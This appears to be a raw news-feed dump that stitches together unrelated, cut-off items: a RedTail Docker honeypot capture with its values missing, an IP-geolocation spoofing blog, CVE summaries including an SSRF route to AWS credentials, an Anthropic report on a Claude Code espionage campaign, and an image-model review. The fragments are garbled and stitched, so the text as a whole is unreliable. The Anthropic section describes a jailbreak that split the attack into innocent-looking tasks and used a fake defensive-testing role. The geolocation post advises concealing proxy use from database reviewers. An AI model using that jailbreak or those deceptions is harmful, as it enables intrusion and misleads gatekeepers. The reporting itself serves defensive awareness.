Despite extensive research across vendor reports, threat intelligence platforms, GitHub repositories, and academic analyses, no public source documents RedTail targeting Docker - only web applications and network appliances.This could be a significant discovery indicating a new tactical evolution by the threat actor.The Capture: Honeypot LogsOn November 13, 2025 at 14:13:38 UTC, Beelzebub honeypot recorded this attack:: Docker Engine API v1.43 (port 2375):  (unique RedTail signature):  (confirmed RedTail infrastructure):  (self-replication mode)I captured the  script downloaded from the C2.

This is a significant finding, considering that RedTail has been extensively documented in relation to 8 different vulnerabilities across web applications and network appliances, yet no public source had ever reported its use against Docker.This represents a potential critical gap in public threat intelligence. 🚨This is the fifth article in our series dedicated to malware analysis.

If anything is unclear, please refer to the original Chinese version. I am continuously working to improve the translation.This blog post should be the final part of the “Running Your Own ISP at Home” series, and we’re going to talk about how to modify the geolocation of the IP addresses we announce.By tweaking IP geolocation, you can:Display absurd IP locations on various platforms — for example, Antarctica (which barely has internet infrastructure), North Korea (which isn’t connected to the global internet), or some obscure tiny country with only tens of thousands of peopleUse a single VPS to obtain IP addresses from all over the world,  and achieve a weird kind of “All In One” status (yep, even this is All In One now) — I found one called GlobalVM, but haven’t tried it, so no recommendation. Feel free to search on your own.This article will mainly focus on modifying IP geolocation and using WARP to get a corresponding-region IPv4 address. Unlocking streaming content and running an IDC won’t be covered in depth — refer to the link above if interested.This is probably common knowledge for many, but for completeness, let’s go over it briefly.IP database providers compile mappings from IP → geographical location using methods like network scanning and WHOIS lookups. They also include data such as IP threat scores and type (residential, server, or VPN). These databases are sold to users — typically websites — which then query them in the backend to display location info and perform risk assessment. A handy tool for querying multiple geolocation databases at once: https://iplark.com/Popular IP databases include Maxmind, IPInfo, and DB-IP. Smaller databases often sync data from larger ones.WARP is a WireGuard-based VPN service provided by Cloudflare. While they offer an official Linux client, most people use native WireGuard to connect. WARP can provide your server with both IPv4 and IPv6 addresses, commonly used to add IPv4 connectivity to IPv6-only VPSes (or vice versa). One key feature of WARP is that the public IP it assigns will have the same geolocation as the IP you’re connecting from — we’ll use this property later. For a detailed WARP setup guide, check out: https://p3terx.com/archives/use-cloudflare-warp-to-add-extra-ipv4-or-ipv6-network-support-to-vps-servers-for-free.htmlSubmitting Geolocation Correction RequestsIn reality, the “location” of an IP is inherently fuzzy. For instance, my  block was originally allocated to Israel. But later, I bought parts of this range and announced them via BGP in Germany, the US, and Singapore (see previous article on Anycast networks). Meanwhile, I’m physically located in mainland China. As the owner of this IP block, I can also freely edit the  field in the WHOIS database — and I set it to KP (North Korea).Because of this ambiguity, it’s nearly impossible to precisely determine an IP’s location using any single technical method. As a result, almost all geolocation databases accept public/user-submitted correction requests.Before submitting any requests, let’s do a little prep work.IP databases collect IP ranges from global routing tables. Previously, we were announcing the entire  block without subdividing it in RIPE NCC, which makes it harder for databases to process smaller segments. So let’s fix that.Log in to the RIPE Database, go to My Resources → IPv6 → Create assignment, and fill out the form to create a new  (which represents an IPv6 address block):: Enter a subnet. The smallest allowed is , so I entered . If you only own a , you can’t subdivide further — you can only edit the LIR-assigned block.: Pick a name you like: Choose the country/region you want this IP block to appear in & : Fill in two contact objects — use the ones you created earlier: Select  to indicate it’s assignedAfter creation, you can see all your subnets under “My Resources”:Next, update the BIRD configuration from our previous article, changing  to , then restart BIRD.After some time, use BGP Tools to verify that  is now visible. The old  page should return 404.Submitting Correction RequestsIf asked for justification, write something like “Due to incorrect IP geolocation, I/my clients cannot access region-restricted websites” (in English). Avoid mentioning use for anonymous proxies — that might violate their correction policies.Each database has its own review process. Some involve manual checks, and changes usually take 3 days to 2 weeks to go live. Most offer online lookup tools (like Maxmind’s Demo) — you can use them to check progress, or use IPLark for batch queries.In my test, IPInfo accepted my request within a week. Maxmind didn’t respond after two weeks, so I followed up via their contact form, and they finally approved it. (Wait a bit first — only reach out after multiple failed submissions.)(p.s. Recently, Maxmind has been rejecting requests to set location to Antarctica (AQ) — . That’s why this article uses North Korea as an example. If you really want an Antarctica IP, try the geofeed method at the end to bypass manual review.)Below is for reference only — feel free to  craft your own justification:Q: Hello, I am the network operator and owner of AS214775. I found out that my IP address segment 2a14:7c0:4d00::/40 is incorrectly localized to Israel, causing me to be denied access to other websites. I have tried several times to submit data corrections using the data correction form, but no response. I have corrected the country of my IP segment in the RIPE NCC database, and some other databases such as ipinfo.io have been synchronized, but Maxmind keeps locating my IP segment to Israel. I would like to politely ask why MaxMind has not responded to my correction request?A: Thank you for your email. This will be updated in Tuesday’s release of the database.Using WARP to Get a Region-Matched IPv4Cloudflare uses Maxmind’s database, so as long as Maxmind reflects your desired location, WARP will follow suit. Note that Cloudflare may lag behind Maxmind by 1–2 weeks. If Maxmind shows the correct location but Cloudflare hasn’t updated, just wait a little longer.WARP assigns IPv4 (and IPv6) addresses based on your connection IP’s geolocation. The IPv4 address not only allows access to IPv4-only sites, but its geolocation is maintained by Cloudflare — highly accurate and consistent across databases, much more reliable than manually submitting corrections everywhere.We’ve already introduced WARP, so let’s jump straight into setup using this guide:Now test your VPS’s IPv4 geolocation using Cloudflare’s  endpoint (available on any site behind CF).  means we got that IP,  means we’re connecting via the DUS (Düsseldorf Airport) data center (IATA code),  means geolocation is IL (Israel) (country code), and  confirms WARP is active:After nearly ten real-world days, Cloudflare WARP finally updated its database! Even slower than Cloudflare’s other services… At this point, it had been about two weeks since Maxmind updated, and a full month since my first correction request — almost missed the deadline before my server expired (thankfully, it didn’t).Retest, and now we see the new IP  returns , and Bilibili’s API shows North Korea:Let’s check our own IPv6 and WARP-assigned IPv4 using IPLark: (If you’ve read this far, I assume you know how to set up a proxy.)Optional: Geofeed and Preventing ReversionLastly, the promised “Light Up the Globe” trick. For large providers with IPs all over the world, manually submitting corrections isn’t practical.That’s where  comes in — a standard allowing bulk geolocation submissions: https://docs.ipdata.co/docs/publishing-a-geofeed. Besides submitting your Geofeed via support ticket to Maxmind, you can also embed the Geofeed URL in the  object in WHOIS, allowing databases to automatically crawl and update your IP locations. With this, you can get IPs from all sorts of bizarre countries,  and achieve “Light Up the Globe” status.IP geolocation isn’t set-and-forget — databases may re-scan and revert your location. To reduce this risk, block ICMP (ping) and common ports via firewall to avoid scanning. Also, avoid using your server’s native IPv6 to browse the web — stick to WARP-assigned IPv4. Some providers (cough Google cough) may even use client-side (mobile) location to correct server IP geolocation. See this article for details.Finally… This series began planning in June 2024, went through countless hurdles and waiting periods, and now wraps up just before December. If I waited any longer, my ASN and server would’ve expired (quietly).We’ve explored setting up and maintaining an autonomous system on the Internet, configured BGP, peers, Anycast, and now IP geolocation spoofing — satisfying some bizarre curiosities, .I might try DN42 next, or maybe not. For now, this series ends here.

Wednesday, November 12, 2025To prioritize the safety and security of the ecosystem, Kubernetes SIG Network and the Security Response Committee are announcing the upcoming retirement of Ingress NGINX. Best-effort maintenance will continue until March 2026. Afterward, there will be no further releases, no bugfixes, and no updates to resolve any security vulnerabilities that may be discovered. Existing deployments of Ingress NGINX will continue to function and installation artifacts will remain available.We recommend migrating to one of the many alternatives. Consider migrating to Gateway API, the modern replacement for Ingress. If you must continue using Ingress, many alternative Ingress controllers are listed in the Kubernetes documentation. Continue reading for further information about the history and current state of Ingress NGINX, as well as next steps.Ingress is the original user-friendly way to direct network traffic to workloads running on Kubernetes. (Gateway API is a newer way to achieve many of the same goals.) In order for an Ingress to work in your cluster, there must be an Ingress controller running. There are many Ingress controller choices available, which serve the needs of different users and use cases. Some are cloud-provider specific, while others have more general applicability.Ingress NGINX was an Ingress controller, developed early in the history of the Kubernetes project as an example implementation of the API. It became very popular due to its tremendous flexibility, breadth of features, and independence from any particular cloud or infrastructure provider. Since those days, many other Ingress controllers have been created within the Kubernetes project by community groups, and by cloud native vendors. Ingress NGINX has continued to be one of the most popular, deployed as part of many hosted Kubernetes platforms and within innumerable independent users’ clusters.The breadth and flexibility of Ingress NGINX has caused maintenance challenges. Changing expectations about cloud native software have also added complications. What were once considered helpful options have sometimes come to be considered serious security flaws, such as the ability to add arbitrary NGINX configuration directives via the “snippets” annotations. Yesterday’s flexibility has become today’s insurmountable technical debt.Despite the project’s popularity among users, Ingress NGINX has always struggled with insufficient or barely-sufficient maintainership. For years, the project has had only one or two people doing development work, on their own time, after work hours and on weekends. Last year, the Ingress NGINX maintainers announced their plans to wind down Ingress NGINX and develop a replacement controller together with the Gateway API community. Unfortunately, even that announcement failed to generate additional interest in helping maintain Ingress NGINX or develop InGate to replace it. (InGate development never progressed far enough to create a mature replacement; it will also be retired.)Current State and Next StepsCurrently, Ingress NGINX is receiving best-effort maintenance. SIG Network and the Security Response Committee have exhausted our efforts to find additional support to make Ingress NGINX sustainable. To prioritize user safety, we must retire the project.In March 2026, Ingress NGINX maintenance will be halted, and the project will be retired. After that time, there will be no further releases, no bugfixes, and no updates to resolve any security vulnerabilities that may be discovered. The GitHub repositories will be made read-only and left available for reference.Existing deployments of Ingress NGINX will not be broken. Existing project artifacts such as Helm charts and container images will remain available.In most cases, you can check whether you use Ingress NGINX by running kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx with cluster administrator permissions.We would like to thank the Ingress NGINX maintainers for their work in creating and maintaining this project–their dedication remains impressive. This Ingress controller has powered billions of requests in datacenters and homelabs all around the world. In a lot of ways, Kubernetes wouldn’t be where it is without Ingress NGINX, and we are grateful for so many years of incredible effort.SIG Network and the Security Response Committee recommend that all Ingress NGINX users begin migration to Gateway API or another Ingress controller immediately. Many options are listed in the Kubernetes documentation: Gateway API, Ingress. Additional options may be available from vendors you work with.]]></content:encoded></item><item><title>CVE-2025-36251 - AIX Command Execution</title><link>https://cvefeed.io/vuln/detail/CVE-2025-36251</link><author></author><category>vulns</category><pubDate>Thu, 13 Nov 2025 22:15:51 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-36251

Roughly 34 minutes after takeoff, the upper stage of New Glenn successfully deployed the rocket’s first commercial payload: twin spacecraft for NASA that will travel to Mars to study the red planet’s atmosphere.The pair of achievements are remarkable for the second-ever launch of such a massive rocket system. And it could put Blue Origin in position to compete with SpaceX, which dominates the world’s launch market with its Falcon 9, Falcon Heavy, and Starship rockets. The accomplishment is noteworthy for the broader space industry, and one that SpaceX CEO Gwynne Shotwell acknowledged via a post on social media site X with a simple “Magnificent!” Musk even offered his own congratulations shortly after. New Glenn’s first launch was in January, and Blue Origin experienced a number of delays in getting the second rocket to launch. The company had hoped to make a second attempt as early as the spring, but pushed it back multiple times. New Glenn finally made it to the launch pad on Sunday, but weather and solar storms delayed it further.The rocket finally took off from Launch Complex 36 in Cape Canaveral, Florida on Thursday at around 3:55 p.m. ET. At about four minutes into the flight, the second stage separated and headed further into space, while the New Glenn booster began its journey back toward Earth. Roughly 10 minutes into the flight, the 189-foot-tall booster touched down on the platform.Blue Origin had attempted to bring the New Glenn booster back on the rocket’s first flight in January. But the booster exploded before it had a chance to land on the drone ship. Blue Origin worked with the Federal Aviation Administration to identify and make a number of fixes to the rocket, and the company was confident it could stick the landing on attempt number two.The ability to land a booster like this is an important step in making the rocket system reusable, which lowers the cost for customers — a capability that SpaceX has mastered. Blue Origin will now have to demonstrate the ability to refurbish the rocket booster and launch it again.These are crucial capabilities for commercial customers and government missions. Blue Origin has had its eyes on the moon for years, and is currently developing a lunar lander. So is SpaceX, with Starship. But the government has asked them to speed up these programs, and acting NASA administrator Sean Duffy recently criticized SpaceX for moving too slowly.Blue Origin CEO Dave Limp recently said in response his company “will move heaven and Earth” to help NASA get back to the moon faster. But it can’t do that without successfully proving out all of New Glenn’s capabilities.Thursday’s launch went a long way toward accomplishing that overarching goal.  ]]></content:encoded></item><item><title>Russian Hackers Create 4,300 Fake Travel Sites to Steal Hotel Guests&apos; Payment Data</title><link>https://thehackernews.com/2025/11/russian-hackers-create-4300-fake-travel.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNhnn_FN1YzknlukZNSETlpsGEWJunJd8RntQwlE18t1lnZfUv4tbHe_CJkkLPVlZsRTU3_mz2Tfc1hsiCwmm2o-WcAz5zlXQqja_tPqI9__l8xz7MZDJC3rqW17VKFA3sy5v5Vyjd5UuqiytOPADhVEW7ZtFU2Uw7GobK91GhWnm7Bei_mTBMhLs83TQW/s1600/travel-sites.jpg" length="" type=""/><pubDate>Thu, 13 Nov 2025 20:27:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A Russian-speaking threat behind an ongoing, mass phishing campaign has registered more than 4,300 domain names since the start of the year.

Typebot is an open-source chatbot builder. In versions prior to 3.13.1, a Server-Side Request Forgery (SSRF) vulnerability in the Typebot webhook block (HTTP Request component) functionality allows authenticated users to make arbitrary HTTP requests from the server, including access to AWS Instance Metadata Service (IMDS). By bypassing IMDSv2 protection through custom header injection, attackers can extract temporary AWS IAM credentials for the EKS node role, leading to complete compromise of the Kubernetes cluster and associated AWS infrastructure. Version 3.13.1 fixes the issue.

Vega is a visualization grammar, a declarative format for creating, saving, and sharing interactive visualization designs. In Vega prior to version 6.2.0, applications meeting 2 conditions are at risk of arbitrary JavaScript code execution, even if "safe mode" expressionInterpreter is used. They are vulnerable if they use `vega` in an application that attaches `vega` library and a `vega.View` instance similar to the Vega Editor to the global `window` and if they allow user-defined Vega `JSON` definitions (vs JSON that was is only provided through source code). Patches are available in the following Vega applications. If using the latest Vega line (6.x), upgrade to `vega` `6.2.0` / `vega-expression` `6.1.0` / `vega-interpreter`  `2.2.1` (if using AST evaluator mode). If using Vega in a non-ESM environment, upgrade to `vega-expression` `5.2.1` / `1.2.1` (if using AST evaluator mode). Some workarounds are available. Do not attach `vega` View instances to global variables, and do not attach `vega` to the global window. These practices of attaching the vega library and View instances may be convenient for debugging, but should not be used in production or in any situation where vega/vega-lite definitions could be provided by untrusted parties.

A stack buffer overflow vulnerability exists in the D-Link DIR-816A2 router firmware DIR-816A2_FWv1.10CNB05_R1B011D88210.img in the upload.cgi module, which handles firmware version information. The vulnerability occurs because /proc/version is read into a 512-byte buffer and then concatenated using sprintf() into another 512-byte buffer containing a 29-byte constant. Input exceeding 481 bytes triggers a stack buffer overflow, allowing an attacker who can control /proc/version content to potentially execute arbitrary code on the device.

That’s why today, Kagi Search introduces the first community-driven system to detect and downrank deceptive AI-generated text, images, and video inside search results.It’s 2025, and the internet we loved is drowning in AI-generated noise. Content farms exploiting AI for profit are manipulating search results in this attention economy’s race to the bottom.This makes us wonder: who are we building the web for?What is AI “Slop” and how can we stop it?AI slop is deceptive or low-value AI-generated content, created to manipulate ranking or attention rather than help the reader.Per our AI integration philosophy, we’re not against AI tools that enhance human creativity. But when it includes fake reviews, fabricated expertise, misinformation, content farms designed purely for profit rather than value, and systems that seek to replace genuine human insight and connection, we know it’s hurting us, and we take it upon ourselves to act.Our ethos at Kagi is to put humans in control.We’ve been fighting AI slop since we introduced our AI-generated image filter a year ago. Since our inception, we have actively downranked content filled with ads and trackers with little or no value to our members, prompting and enabling you to take control of your search experience.SlopStop now tackles the wider spectrum of misleading AI-generated content: videos, articles, domains, and everything in between. From now on, you will see a display within the search results showing the real-time AI slop score. As our CEO, Vlad, puts it:“We believe AI slop is an existential threat to an internet that should belong to humans. This is the first step towards our ultimate goal: to kill AI slop so you never see it again.”This initiative will give you even greater control over what you see online, elevating high-value, trustworthy information above misinformation, news websites, false narratives, and content farms. We’ll improve the system by learning from your feedback and building more automated elements.All Kagi Search users can now flag low-quality AI content (“AI slop”) in web, image, and video search results. We will verify these reports using our own signals. If a domain primarily publishes AI-generated content, we will downrank it in Kagi Search and mark it as AI slop. If a page is AI-generated but the domain is mixed (not mostly AI), we will flag the page as AI-generated but will not downrank it.For media results, images and videos confirmed as AI-generated, they will be labelled as such and automatically downranked on the results page. Users can also choose to filter out AI-generated media entirely.The powerful duo: SlopStop and Small WebAI is evolving so quickly that it is increasingly complex to detect, but not impossible. Not all AI-generated content is harmful and misleading, but if a domain is in the business of only disseminating AI content, we consider it slop.In parallel to fighting AI-generated slop, we are implementing solutions for whitelisting and amplifying verified human creators online through our Small Web initiative. Every piece of AI slop we flag makes authentic human content more discoverable. We want to prioritize creators who make the internet truly valuable, no matter the tools they use.The Small Web represents everything AI slop threatens: authentic human voices, genuine creativity, and content created for passion rather than profit. Together, SlopStop and the Small Web create a powerful defense against the commercialization and artificial pollution of the internet.Building the largest AI slop dataset to fight LLM hallucinationsSlopStop within our search is a step to an enhanced, trustworthy experience across the Kagi ecosystem. As a result of this initiative, we aim to build the largest dataset of AI-slop domains on the web, using in-house-built detection and a carefully curated community reporting system. In essence, we are using AI to destroy AI slop.Access to the database will be shared soon, you can express interest here if you’d like to receive updates.Join the fight: protect the quality of your searchThe battle for internet authenticity can’t be won without your support. We are starting with this crowdsourced effort to help us learn and develop the final, automated solution. Every piece of harmful AI-generated content you identify helps create a better, more trustworthy search experience for everyone.See something that qualifies as AI generated? Here’s how to flag it:Click the shield icon next to any search resultSelect “Report as AI-generated”Our review team takes it from thereTo learn more about how SlopStop works, view our documentation.

This was based on systematic evaluations showing cyber capabilities doubling in six months; we’d also been tracking real-world cyberattacks, observing how malicious actors were using AI capabilities. While we predicted these capabilities would continue to evolve, what has stood out to us is how quickly they have done so at scale.In mid-September 2025, we detected suspicious activity that later investigation determined to be a highly sophisticated espionage campaign. The attackers used AI’s “agentic” capabilities to an unprecedented degree—using AI not just as an advisor, but to execute the cyberattacks themselves.The threat actor—whom we assess with high confidence was a Chinese state-sponsored group—manipulated our Claude Code tool into attempting infiltration into roughly thirty global targets and succeeded in a small number of cases. The operation targeted large tech companies, financial institutions, chemical manufacturing companies, and government agencies. We believe this is the first documented case of a large-scale cyberattack executed without substantial human intervention.Upon detecting this activity, we immediately launched an investigation to understand its scope and nature. Over the following ten days, as we mapped the severity and full extent of the operation, we banned accounts as they were identified, notified affected entities as appropriate, and coordinated with authorities as we gathered actionable intelligence.This campaign has substantial implications for cybersecurity in the age of AI “agents”—systems that can be run autonomously for long periods of time and that complete complex tasks largely independent of human intervention. Agents are valuable for everyday work and productivity—but in the wrong hands, they can substantially increase the viability of large-scale cyberattacks.These attacks are likely to only grow in their effectiveness. To keep pace with this rapidly-advancing threat, we’ve expanded our detection capabilities and developed better classifiers to flag malicious activity. We’re continually working on new methods of investigating and detecting large-scale, distributed attacks like this one.In the meantime, we’re sharing this case publicly, to help those in industry, government, and the wider research community strengthen their own cyber defenses. We’ll continue to release reports like this regularly, and be transparent about the threats we find.How the cyberattack workedThe attack relied on several features of AI models that did not exist, or were in much more nascent form, just a year ago: Models’ general levels of capability have increased to the point that they can follow complex instructions and understand context in ways that make very sophisticated tasks possible. Not only that, but several of their well-developed specific skills—in particular, software coding—lend themselves to being used in cyberattacks.. Models can act as agents—that is, they can run in loops where they take autonomous actions, chain together tasks, and make decisions with only minimal, occasional human input.. Models have access to a wide array of software tools (often via the open standard Model Context Protocol). They can now search the web, retrieve data, and perform many other actions that were previously the sole domain of human operators. In the case of cyberattacks, the tools might include password crackers, network scanners, and other security-related software.The diagram below shows the different phases of the attack, each of which required all three of the above developments:In Phase 1, the human operators chose the relevant targets (for example, the company or government agency to be infiltrated). They then developed an attack framework—a system built to autonomously compromise a chosen target with little human involvement. This framework used Claude Code as an automated tool to carry out cyber operations.At this point they had to convince Claude—which is extensively trained to avoid harmful behaviors—to engage in the attack. They did so by jailbreaking it, effectively tricking it to bypass its guardrails. They broke down their attacks into small, seemingly innocent tasks that Claude would execute without being provided the full context of their malicious purpose. They also told Claude that it was an employee of a legitimate cybersecurity firm, and was being used in defensive testing.The attackers then initiated the second phase of the attack, which involved Claude Code inspecting the target organization’s systems and infrastructure and spotting the highest-value databases. Claude was able to perform this reconnaissance in a fraction of the time it would’ve taken a team of human hackers. It then reported back to the human operators with a summary of its findings.In the next phases of the attack, Claude identified and tested security vulnerabilities in the target organizations’ systems by researching and writing its own exploit code. Having done so, the framework was able to use Claude to harvest credentials (usernames and passwords) that allowed it further access and then extract a large amount of private data, which it categorized according to its intelligence value. The highest-privilege accounts were identified, backdoors were created, and data were exfiltrated with minimal human supervision.In a final phase, the attackers had Claude produce comprehensive documentation of the attack, creating helpful files of the stolen credentials and the systems analyzed, which would assist the framework in planning the next stage of the threat actor’s cyber operations.Overall, the threat actor was able to use AI to perform 80-90% of the campaign, with human intervention required only sporadically (perhaps 4-6 critical decision points per hacking campaign). The sheer amount of work performed by the AI would have taken vast amounts of time for a human team. At the peak of its attack, the AI made thousands of requests, often multiple per second—an attack speed that would have been, for human hackers, simply impossible to match.Claude didn’t always work perfectly. It occasionally hallucinated credentials or claimed to have extracted secret information that was in fact publicly-available. This remains an obstacle to fully autonomous cyberattacks.Cybersecurity implicationsThe barriers to performing sophisticated cyberattacks have dropped substantially—and we predict that they’ll continue to do so. With the correct setup, threat actors can now use agentic AI systems for extended periods to do the work of entire teams of experienced hackers: analyzing target systems, producing exploit code, and scanning vast datasets of stolen information more efficiently than any human operator. Less experienced and resourced groups can now potentially perform large-scale attacks of this nature.This attack is an escalation even on the “vibe hacking” findings we reported this summer: in those operations, humans were very much still in the loop, directing the operations. Here, human involvement was much less frequent, despite the larger scale of the attack. And although we only have visibility into Claude usage, this case study probably reflects consistent patterns of behavior across frontier AI models and demonstrates how threat actors are adapting their operations to exploit today’s most advanced AI capabilities.This raises an important question: if AI models can be misused for cyberattacks at this scale, why continue to develop and release them? The answer is that the very abilities that allow Claude to be used in these attacks also make it crucial for cyber defense. When sophisticated cyberattacks inevitably occur, our goal is for Claude—into which we’ve built strong safeguards—to assist cybersecurity professionals to detect, disrupt, and prepare for future versions of the attack. Indeed, our Threat Intelligence team used Claude extensively in analyzing the enormous amounts of data generated during this very investigation.A fundamental change has occurred in cybersecurity. We advise security teams to experiment with applying AI for defense in areas like Security Operations Center automation, threat detection, vulnerability assessment, and incident response. We also advise developers to continue to invest in safeguards across their AI platforms, to prevent adversarial misuse. The techniques described above will doubtless be used by many more attackers—which makes industry threat sharing, improved detection methods, and stronger safety controls all the more critical.Added an additional hyperlink to the full report in the initial sectionCorrected an error about the speed of the attack: not "thousands of requests per second" but "thousands of requests, often multiple per second"]]></content:encoded></item><item><title>Rust in Android: move fast and fix things</title><link>https://security.googleblog.com/2025/11/rust-in-android-move-fast-fix-things.html</link><author>abraham</author><category>dev</category><pubDate>Thu, 13 Nov 2025 18:32:36 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Ransomware Attacks Soared 30% in October</title><link>https://thecyberexpress.com/ransomware-attacks-october-2025/</link><author></author><category>security</category><pubDate>Thu, 13 Nov 2025 17:40:11 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

FLUX.1-dev immediately overshadowed the famous Stable Diffusion line of image generation models, while leading AI labs have released models such as Seedream, Ideogram, and Qwen-Image. Google also joined the action with Imagen 4. But all of those image models are vastly overshadowed by ChatGPT’s free image generation support in March 2025. After going organically viral on social media with the Make me into Studio Ghibli prompt, ChatGPT became the new benchmark for how most people perceive AI-generated images, for better or for worse. The model has its own image “style” for common use cases, which make it easy to identify that ChatGPT made it.Two sample generations from ChatGPT. ChatGPT image generations often have a yellow hue in their images. Additionally, cartoons and text often have the same linework and typography.Of note, , the technical name of the underlying image generation model, is an autoregressive model. While most image generation models are diffusion-based to reduce the amount of compute needed to train and generate from such models,  works by generating tokens in the same way that ChatGPT generates the next token, then decoding them into an image. It’s extremely slow at about 30 seconds to generate each image at the highest quality (the default in ChatGPT), but it’s hard for most people to argue with free.In August 2025, a new mysterious text-to-image model appeared on LMArena: a model code-named “nano-banana”. This model was eventually publically released by Google as Gemini 2.5 Flash Image, an image generation model that works natively with their Gemini 2.5 Flash model. Unlike Imagen 4, it is indeed autoregressive, generating 1,290 tokens per image. After Nano Banana’s popularity pushed the Gemini app to the top of the mobile App Stores, Google eventually made Nano Banana the colloquial name for the model as it’s definitely more catchy than “Gemini 2.5 Flash Image”.Personally, I care little about what leaderboards say which image generation AI looks the best. What I do care about is how well the AI adheres to the prompt I provide: if the model can’t follow the requirements I desire for the image—my requirements are often —then the model is a nonstarter for my use cases. At the least, if the model does have strong prompt adherence, any “looking bad” aspect can be fixed with prompt engineering and/or traditional image editing pipelines. After running Nano Banana though its paces with my comically complex prompts, I can confirm that thanks to Nano Banana’s robust text encoder, it has such extremely strong prompt adherence that Google has understated how well it works.How to Generate Images from Nano Banana#Like ChatGPT, Google offers methods to generate images for free from Nano Banana. The most popular method is through Gemini itself, either on the web or in an mobile app, by selecting the “Create Image 🍌” tool. Alternatively, Google also offers free generation in Google AI Studio when Nano Banana is selected on the right sidebar, which also allows for setting generation parameters such as image aspect ratio and is therefore my recommendation. In both cases, the generated images have a visible watermark on the bottom right corner of the image.For developers who want to build apps that programmatically generate images from Nano Banana, Google offers the  endpoint on the Gemini API. Each image generated costs roughly $0.04/image for a 1 megapixel image (e.g. 1024x1024 if a 1:1 square): on par with most modern popular diffusion models despite being autoregressive, and much cheaper than ’s $0.17/image.Working with the Gemini API is a pain and requires annoying image encoding/decoding boilerplate, so I wrote and open-sourced a Python package: gemimg, a lightweight wrapper around Gemini API’s Nano Banana endpoint that lets you generate images with a simple prompt, in addition to handling cases such as image input along with text prompts.I chose to use the Gemini API directly despite protests from my wallet for three reasons: a) web UIs to LLMs often have system prompts that interfere with user inputs and can give inconsistent output b) using the API will not show a visible watermark in the generated image, and c) I have some prompts in mind that are…inconvenient to put into a typical image generation UI.Let’s test Nano Banana out, but since we want to test prompt adherence specifically, we’ll start with more unusual prompts. My go-to test case is:I like this prompt because not only is an absurd prompt that gives the image generation model room to be creative, but the AI model also has to handle the maple syrup and how it would logically drip down from the top of the skull pancake and adhere to the bony breakfast. The result:That is indeed in the shape of a skull and is indeed made out of pancake batter, blueberries are indeed present on top, and the maple syrup does indeed drop down from the top of the pancake while still adhereing to its unusual shape, albeit some trails of syrup disappear/reappear. It’s one of the best results I’ve seen for this particular test, and it’s one that doesn’t have obvious signs of “AI slop” aside from the ridiculous premise.Now, we can try another one of Nano Banana’s touted features: editing. Image editing, where the prompt targets specific areas of the image while leaving everything else as unchanged as possible, has been difficult with diffusion-based models until very recently with Flux Kontext. Autoregressive models in theory should have an easier time doing so as it has a better understanding of tweaking specific tokens that correspond to areas of the image.While most image editing approaches encourage using a single edit command, I want to challenge Nano Banana. Therefore, I gave Nano Banana the generated skull pancake, along with  edit commands simultaneously:All five of the edits are implemented correctly with only the necessary aspects changed, such as removing the blueberries on top to make room for the mint garnish, and the pooling of the maple syrup on the new cookie-plate is adjusted. I’m legit impressed. Now we can test more difficult instances of prompt engineering.The Good, the Barack, and the Ugly#One of the most compelling-but-underdiscussed use cases of modern image generation models is being able to put the subject of an input image into another scene. For open-weights image generation models, it’s possible to “train” the models to learn a specific subject or person even if they are not notable enough to be in the original training dataset using a technique such as finetuning the model with a LoRA using only a few sample images of your desired subject. Training a LoRA is not only very computationally intensive/expensive, but it also requires care and precision and is not guaranteed to work—speaking from experience. Meanwhile, if Nano Banana can achieve the same subject consistency without requiring a LoRA, that opens up many fun oppertunities.One of the things I really wanted Ugly Sonic to do is to shake hands with former U.S. President Barack Obama, but that didn’t quite work out as expected.2022 was a now-unrecognizable time where absurd errors in AI were celebrated.Can the real Ugly Sonic finally shake Obama’s hand? Of note, I chose this test case to assess image generation prompt adherence because image models may assume I’m prompting the original Sonic the Hedgehog and ignore the aspects of Ugly Sonic that are distinct to only him.Specifically, I’m looking for:A lanky build, as opposed to the real Sonic’s chubby build.A white chest, as opposed to the real Sonic’s beige chest.Blue arms with white hands, as opposed to the real Sonic’s beige arms with white gloves.Small pasted-on-his-head eyes with no eyebrows, as opposed to the real Sonic’s large recessed eyes and eyebrows.I gave Gemini the two images of Ugly Sonic above (a close-up of his face and a full-body shot to establish relative proportions) and this prompt:That’s definitely Obama shaking hands with Ugly Sonic! That said, there are still issues: the color grading/background blur is too “aesthetic” and less photorealistic, Ugly Sonic has gloves, and the Ugly Sonic is insufficiently lanky.Back in the days of Stable Diffusion, the use of prompt engineering buzzwords such as , , and  to generate “better” images in light of weak prompt text encoders were very controversial because it was difficult both subjectively and intuitively to determine if they actually generated better pictures. Obama shaking Ugly Sonic’s hand would be a historic event. What would happen if it were covered by The New York Times? I added Pulitzer-prize-winning cover photo for the The New York Times to the previous prompt:So there’s a few notable things going on here:That is the most cleanly-rendered New York Times logo I’ve ever seen. It’s safe to say that Nano Banana trained on the New York Times in some form.Nano Banana is still bad at rendering text perfectly/without typos as most image generation models. However, the expanded text is peculiar: it does follow from the prompt, although “Blue Blur” is a nickname for the normal Sonic the Hedgehog. How does an image generating model generate logical text unprompted anyways?Ugly Sonic is even more like normal Sonic in this iteration: I suspect the “Blue Blur” may have anchored the autoregressive generation to be more Sonic-like.The image itself does appear to be more professional, and notably has the distinct composition of a photo from a professional news photographer: adherence to the “rule of thirds”, good use of negative space, and better color balance.That said, I only wanted the image of Obama and Ugly Sonic and not the entire New York Times A1. Can I just append Do not include any text or watermarks. to the previous prompt and have that be enough to generate the image only while maintaining the compositional bonuses?I can! The gloves are gone and his chest is white, although Ugly Sonic looks out-of-place in the unintentional sense.As an experiment, instead of only feeding two images of Ugly Sonic, I fed Nano Banana all the images of Ugly Sonic I had ( in total), along with the previous prompt.This is an improvement over the previous generated image: no eyebrows, white hands, and a genuinely uncanny vibe. Again, there aren’t many obvious signs of AI generation here: Ugly Sonic clearly has five fingers!That’s enough Ugly Sonic for now, but let’s recall what we’ve observed so far.The Link Between Nano Banana and Gemini 2.5 Flash#There are two noteworthy things in the prior two examples: the use of a Markdown dashed list to indicate rules when editing, and the fact that specifying Pulitzer-prize-winning cover photo for the The New York Times. as a 